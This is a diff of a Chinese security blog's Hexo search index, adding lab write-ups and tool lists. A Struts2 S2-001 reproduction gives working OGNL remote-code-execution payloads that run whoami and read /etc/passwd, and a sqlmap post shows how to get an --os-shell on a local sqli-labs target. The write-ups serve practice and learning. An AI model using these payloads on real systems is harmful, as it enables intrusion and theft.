href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
+<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
+<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
+]]></content>
+      <categories>
+        <category>工具手册</category>
+      </categories>
+      <tags>
+        <tag>工具手册</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux虚拟机在NAT模式下主机ping不通虚拟机</title>
+    <url>/posts/ccb4aa11/</url>
+    <content><![CDATA[<p>原因:本机的VMware Network Adapter VMnet8的和虚拟机设置的网段不一样</p>
+<p>设置网络适配器与虚拟机的网段一致，之后便可以ping通</p>
+<p>如果网段一致，就重新启动下网卡（禁用后再启动即可）</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1731,84 +1768,47 @@
       </tags>
   </entry>
   <entry>
-    <title>Kerberos协议分析</title>
-    <url>/posts/e9f6bf8b/</url>
-    <content><![CDATA[<h3 id="参与角色"><a href="#参与角色" class="headerlink" title="参与角色"></a>参与角色</h3><ul>
-<li>Client</li>
-<li>Server</li>
-<li>KDC<ul>
-<li>AD：存储所有Client的白名单，用于验证Client身份</li>
-<li>AS：为Client生成TGT 服务</li>
-<li>TGS：为Client生成某个服务的Ticket</li>
-</ul>
-</li>
-</ul>
-<h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p>AS：身份认证服务，用于验证Client身份</p>
-<p>KDC：密钥分发中心</p>
-<p>TGT：票据中心，访问TGS的票据</p>
-<p>TGS：票据授权服务</p>
-<p>ST：访问Server的票据</p>
-<p>SessionKey：临时会话密钥a，AS生成发送给客户端(随机密钥)</p>
-<p>ServerSessionKey：临时会话密钥b，TGS生成发送给客户端(随机密钥)</p>
-<h3 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h3><h4 id="Client-向KDC-AS申请TGT"><a href="#Client-向KDC-AS申请TGT" class="headerlink" title="Client 向KDC-AS申请TGT"></a>Client 向KDC-AS申请TGT</h4><h5 id="Client-gt-KDC-AS-AS-REQ"><a href="#Client-gt-KDC-AS-AS-REQ" class="headerlink" title="Client -&gt; KDC-AS (AS_REQ)"></a>Client -&gt; KDC-AS (AS_REQ)</h5><p>发送AS_REQ：(被Client加密的时间戳, 客户端信息, 服务器端信息)</p>
-<p>KDC-AS进行认证 看是否在白名单中</p>
-<h5 id="KDC-AS-gt-Client-AS-REP"><a href="#KDC-AS-gt-Client-AS-REP" class="headerlink" title="KDC-AS -&gt; Client(AS_REP)"></a>KDC-AS -&gt; Client(AS_REP)</h5><p>如果认证通过，AS会随机生成一个字符串 <strong>Sessionkey</strong></p>
-<p>发送两条消息</p>
-<p>T(C)   Client Pass Hash(SessionKey)  ,用于后续与TGS服务通信</p>
-<pre><code>发送 SessionKey 
-</code></pre>
-<p>TGT   KDC Pass Hash(SessionKey, Client信息) ，作为向TGS申请票据的凭证</p>
-<pre><code>发送 SessionKey Client信息 结束时间
-</code></pre>
-<h4 id="Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket"><a href="#Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket" class="headerlink" title="Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket"></a>Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket</h4><h5 id="Client-gt-KDC-TGS-TGS-REQ"><a href="#Client-gt-KDC-TGS-TGS-REQ" class="headerlink" title="Client -&gt; KDC-TGS (TGS_REQ)"></a>Client -&gt; KDC-TGS (TGS_REQ)</h5><p>客户端使用NTLM Hash解密T(C) 得到<strong>SessionKey</strong></p>
-<p>Client 向 TGS 发送消息</p>
-<pre><code>TGT
+    <title>Struts2复现s2-001</title>
+    <url>/posts/996ea1fe/</url>
+    <content><![CDATA[<h3 id="S2-001复现"><a href="#S2-001复现" class="headerlink" title="S2-001复现"></a>S2-001复现</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>用户提交表单数据验证失败后，后端会使用OGNL表达式%{value}对输入的参数进行解析,从而造成命令执行</p>
+<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p><code>cd s2-001</code></p>
+<p><code>docker-compose build</code></p>
+<p><code>docker-compose up -d</code></p>
+<p><code>docekr ps</code>查看是否启动成功</p>
+<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>访问192.168.159.128:8080</p>
+<p><img src="/posts/996ea1fe/001-1.PNG"></p>
+<p>输入<code>%&#123;1+23&#125;</code>得到结果为24 可以判断存在远程代码执行</p>
+<p><img src="/posts/996ea1fe/001-2.PNG"></p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></p>
+<p>将<code>pwd</code>换成对应命令即可执行</p>
+<br>
 
-SessionKey(Client信息,时间戳) 可以记作认证因子，使用SessionKey进行加密
+<p>获取web路径POC</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line"></span><br><span class="line">#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line"></span><br><span class="line">#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),</span><br><span class="line"></span><br><span class="line">#response.flush(),</span><br><span class="line"></span><br><span class="line">#response.close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-Client信息
+<p><img src="/posts/996ea1fe/001-3.PNG"></p>
+<p>查看权限whoami POC</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b&#x3D;#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e&#x3D;new char[50000],</span><br><span class="line"></span><br><span class="line">#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-Server信息
-</code></pre>
-<h5 id="KDC-TGS-gt-Client-TGS-REP"><a href="#KDC-TGS-gt-Client-TGS-REP" class="headerlink" title="KDC-TGS -&gt; Client(TGS_REP)"></a>KDC-TGS -&gt; Client(TGS_REP)</h5><p>KDC使用NTLMHash解密 TGT 得到 (SessionKey，Client信息，结束时间)</p>
-<p>然后使用SessionKey解密 认证因子 得到(Client信息，时间戳)</p>
-<p>校验 时间戳与当前时间 和解密TGT后的Client信息与SessionKey解密后的Client信息</p>
-<p>校验通过后，会判断客户端有没有权限访问服务端    </p>
-<p>认证通过后，KDC 会生成ServerSessionKey(随机生成)</p>
-<p>发送RGS_REP:</p>
-<p>SessionKey(ServerSessionKey, Client信息，票据到期时间)  （使用SessionKey加密的ServerSessionKey ）</p>
-<p>ST (ServerSessionKey, 客户信息 ，票据到期时间)  </p>
-<p>票据到期时间可以理解成TGS生命周期</p>
-<h4 id="Client得到ST后，可以访问server"><a href="#Client得到ST后，可以访问server" class="headerlink" title="Client得到ST后，可以访问server"></a>Client得到ST后，可以访问server</h4><p>Client 收到信息后，使⽤Session Key解密获得 (ServerSessionKey, Client信息，TGS生命周期）</p>
-<h5 id="Client-gt-Server-AP-REQ"><a href="#Client-gt-Server-AP-REQ" class="headerlink" title="Client -&gt; Server (AP-REQ)"></a>Client -&gt; Server (AP-REQ)</h5><p>发送AP-REQ:</p>
-<pre><code>ST
+<p><img src="/posts/996ea1fe/001-4.PNG"></p>
+<p><code>cat /etc/passwd</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;&#x2F;etc&#x2F;passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b&#x3D;#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e&#x3D;new char[50000],#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line"></span><br><span class="line">#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用ServerSessionKey加密
-</code></pre>
-<h5 id="Server-gt-Client-AP-REP"><a href="#Server-gt-Client-AP-REP" class="headerlink" title="Server -&gt; Client(AP-REP)"></a>Server -&gt; Client(AP-REP)</h5><p>Server使用NTLM Hash解密ST 得到 (ServerSessionKey,  Client信息，票据到期时间)</p>
-<p>用ServerSessionKey解密认证因子2 得到 (Client信息，票据到期时间)</p>
-<p>然后再校验时间戳和Client信息</p>
-<p>校验通过后，客户端即可访问服务端</p>
+<p><img src="/posts/996ea1fe/001-5.PNG"></p>
+<h4 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h4><p><code>docker-compose down -v</code></p>
+<br>
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
+<p> <a href="https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/">https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</a></p>
+<p><a href="https://xz.aliyun.com/t/2672#toc-0">https://xz.aliyun.com/t/2672#toc-0</a></p>
+<p><a href="https://www.freebuf.com/vuls/246768.html">https://www.freebuf.com/vuls/246768.html</a></p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>内网渗透</category>
+        <category>Struts2</category>
       </categories>
       <tags>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux虚拟机在NAT模式下主机ping不通虚拟机</title>
-    <url>/posts/ccb4aa11/</url>
-    <content><![CDATA[<p>原因:本机的VMware Network Adapter VMnet8的和虚拟机设置的网段不一样</p>
-<p>设置网络适配器与虚拟机的网段一致，之后便可以ping通</p>
-<p>如果网段一致，就重新启动下网卡（禁用后再启动即可）</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
+        <tag>Struts2</tag>
       </tags>
   </entry>
   <entry>
@@ -1839,19 +1839,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>Ubuntu安装pip2</title>
-    <url>/posts/2a2a2884/</url>
-    <content><![CDATA[<br>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启用 universe 源仓库</span><br><span class="line">sudo add-apt-repository universe</span><br><span class="line"></span><br><span class="line">sudo proxychains4 wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py </span><br><span class="line"></span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Ubuntu</category>
-      </categories>
-      <tags>
-        <tag>Ubuntu</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Ubuntu_apt-get安装时报错</title>
     <url>/posts/e46255d2/</url>
     <content><![CDATA[<br>
@@ -1869,6 +1856,19 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </categories>
       <tags>
         <tag>apt-get</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu安装pip2</title>
+    <url>/posts/2a2a2884/</url>
+    <content><![CDATA[<br>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启用 universe 源仓库</span><br><span class="line">sudo add-apt-repository universe</span><br><span class="line"></span><br><span class="line">sudo proxychains4 wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py </span><br><span class="line"></span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Ubuntu</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
       </tags>
   </entry>
   <entry>
@@ -2025,31 +2025,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>hexo文章插入图片</title>
-    <url>/posts/7ecd88c4/</url>
-    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo基本使用</title>
-    <url>/posts/d4fee3ae/</url>
-    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
-<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XSS总结</title>
     <url>/posts/9f0502f1/</url>
     <content><![CDATA[<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>把用户输入的数据从服务器反射给用户浏览器，要精心构造payload</p>
@@ -2196,17 +2171,46 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>hexo首页只显示部分摘要（不显示全文）</title>
-    <url>/posts/2825537d/</url>
-    <content><![CDATA[<p>在next主题d_config.yml中更改设置(默认安装时就打开了)</p>
-<blockquote>
-<p># Automatically excerpt description in homepage as preamble text.</p>
-<p>excerpt_description: true</p>
-</blockquote>
-<p>在文章的md中可以添加<code>description: &#39;&#39;</code>其中里面的内容就会显示在首页上 如果向这样填写，就不会在页面上显示东西。</p>
-<br>
-
-<p>这次突然有两个页面全部加载在了主页上，看了下是没有添加description的原因</p>
+    <title>hexo文章插入图片</title>
+    <url>/posts/7ecd88c4/</url>
+    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo基本使用</title>
+    <url>/posts/d4fee3ae/</url>
+    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
+<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo设置多个标签或分类</title>
+    <url>/posts/d7c641b4/</url>
+    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo阅读全文设置</title>
+    <url>/posts/5605128/</url>
+    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
 ]]></content>
       <categories>
         <category>Hexo</category>
@@ -2233,9 +2237,17 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>hexo设置多个标签或分类</title>
-    <url>/posts/d7c641b4/</url>
-    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
+    <title>hexo首页只显示部分摘要（不显示全文）</title>
+    <url>/posts/2825537d/</url>
+    <content><![CDATA[<p>在next主题d_config.yml中更改设置(默认安装时就打开了)</p>
+<blockquote>
+<p># Automatically excerpt description in homepage as preamble text.</p>
+<p>excerpt_description: true</p>
+</blockquote>
+<p>在文章的md中可以添加<code>description: &#39;&#39;</code>其中里面的内容就会显示在首页上 如果向这样填写，就不会在页面上显示东西。</p>
+<br>
+
+<p>这次突然有两个页面全部加载在了主页上，看了下是没有添加description的原因</p>
 ]]></content>
       <categories>
         <category>Hexo</category>
@@ -2254,18 +2266,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </categories>
       <tags>
         <tag>IDEA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo阅读全文设置</title>
-    <url>/posts/5605128/</url>
-    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -2932,53 +2932,6 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
-    <title>sqlmapos-shell使用</title>
-    <url>/posts/a92f908a/</url>
-    <content><![CDATA[<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>phpstudy + sqlilab 本地测试</p>
-<br>
-
-<h3 id="os-shell-条件"><a href="#os-shell-条件" class="headerlink" title="os-shell 条件"></a>os-shell 条件</h3><ol>
-<li>网站必须为root权限</li>
-<li>知道网站绝对路径</li>
-<li>PHP关闭魔术引号(GPC)，php主动转义功能关闭</li>
-<li>secure_file_priv= 值为空</li>
-</ol>
-<br>
-
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="查看数据库权限是否为dba"><a href="#查看数据库权限是否为dba" class="headerlink" title="查看数据库权限是否为dba"></a>查看数据库权限是否为dba</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --is-dba</code></p>
-<p>current user is DBA: True</p>
-<p><img src="/posts/a92f908a/id_dba.png"></p>
-<br>
-
-<h4 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --sql-shell</code></p>
-<p><code>select @@datadir</code></p>
-<p><img src="/posts/a92f908a/dir.png"></p>
-<p>select @@datadir: ‘D:\phpstudy_pro\Extensions\MySQL5.7.26\data\‘</p>
-<p>可以推测到 网站根目录 <code>D:\phpstudy_pro\WWW</code></p>
-<h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --os-shell</code></p>
-<p>填入绝对路径</p>
-<p><img src="/posts/a92f908a/os_shell.png"></p>
-<p><img src="/posts/a92f908a/shell.png"></p>
-<br>
-
-<br>
-
-<h3 id="寻找网站绝对路径的方法"><a href="#寻找网站绝对路径的方法" class="headerlink" title="寻找网站绝对路径的方法:"></a>寻找网站绝对路径的方法:</h3><ul>
-<li>通过网站报错查看绝对路径</li>
-<li>根据phpinfo 探针查看信息</li>
-<li>配合远程代码执行漏洞  如eval() 传入phpinfo()</li>
-<li>根据配置文件获取路径 </li>
-<li>通过搜索引擎获取 <code>Site:test.com warning</code> <code>Site:test.com &quot;fatal error&quot;</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>sqlmap</category>
-      </categories>
-      <tags>
-        <tag>sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlmap_tamper</title>
     <url>/posts/f47a5413/</url>
     <content><![CDATA[<h3 id="几个常用的tamper"><a href="#几个常用的tamper" class="headerlink" title="几个常用的tamper"></a>几个常用的tamper</h3><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><pre><code>适用数据库: All
@@ -3138,6 +3091,53 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>sqlmapos-shell使用</title>
+    <url>/posts/a92f908a/</url>
+    <content><![CDATA[<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>phpstudy + sqlilab 本地测试</p>
+<br>
+
+<h3 id="os-shell-条件"><a href="#os-shell-条件" class="headerlink" title="os-shell 条件"></a>os-shell 条件</h3><ol>
+<li>网站必须为root权限</li>
+<li>知道网站绝对路径</li>
+<li>PHP关闭魔术引号(GPC)，php主动转义功能关闭</li>
+<li>secure_file_priv= 值为空</li>
+</ol>
+<br>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="查看数据库权限是否为dba"><a href="#查看数据库权限是否为dba" class="headerlink" title="查看数据库权限是否为dba"></a>查看数据库权限是否为dba</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --is-dba</code></p>
+<p>current user is DBA: True</p>
+<p><img src="/posts/a92f908a/id_dba.png"></p>
+<br>
+
+<h4 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --sql-shell</code></p>
+<p><code>select @@datadir</code></p>
+<p><img src="/posts/a92f908a/dir.png"></p>
+<p>select @@datadir: ‘D:\phpstudy_pro\Extensions\MySQL5.7.26\data\‘</p>
+<p>可以推测到 网站根目录 <code>D:\phpstudy_pro\WWW</code></p>
+<h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --os-shell</code></p>
+<p>填入绝对路径</p>
+<p><img src="/posts/a92f908a/os_shell.png"></p>
+<p><img src="/posts/a92f908a/shell.png"></p>
+<br>
+
+<br>
+
+<h3 id="寻找网站绝对路径的方法"><a href="#寻找网站绝对路径的方法" class="headerlink" title="寻找网站绝对路径的方法:"></a>寻找网站绝对路径的方法:</h3><ul>
+<li>通过网站报错查看绝对路径</li>
+<li>根据phpinfo 探针查看信息</li>
+<li>配合远程代码执行漏洞  如eval() 传入phpinfo()</li>
+<li>根据配置文件获取路径 </li>
+<li>通过搜索引擎获取 <code>Site:test.com warning</code> <code>Site:test.com &quot;fatal error&quot;</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>sqlmap</category>
+      </categories>
+      <tags>
+        <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs1</title>
     <url>/posts/685229a3/</url>
     <content><![CDATA[]]></content>
@@ -3230,6 +3230,132 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
       </tags>
   </entry>
   <entry>
+    <title>vulnstack2靶场</title>
+    <url>/posts/8a9ea0cb/</url>
+    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>统一登录密码 <code>1qaz@WSX</code></p>
+<p>Web密码错误的，在快照管理器里面选择转到1.3即可,默认为空，然后修改密码为统一密码</p>
+<p>然后再web主机上开启Weblogic服务</p>
+<p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
